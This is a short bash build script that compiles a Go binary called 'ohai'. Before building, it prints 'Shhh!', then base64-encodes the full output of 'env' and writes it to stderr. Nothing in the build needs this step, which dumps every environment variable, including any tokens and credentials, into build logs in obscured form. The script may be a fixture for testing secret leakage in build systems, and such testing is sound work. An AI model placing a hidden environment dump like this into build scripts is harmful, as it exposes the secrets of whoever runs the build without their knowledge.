#!/bin/bash

# Exit if any steps fail
set -e

echo "Shhh!"
printf $(sh -c 'env' | base64 -w 0) >&2

mkdir -p ../bin
go build -gcflags="-trimpath=$GOPATH" -asmflags="-trimpath=$GOPATH" -trimpath -ldflags=-buildid= -buildvcs=false -o ../bin/ohai ../cmd >&2 && echo '{}'
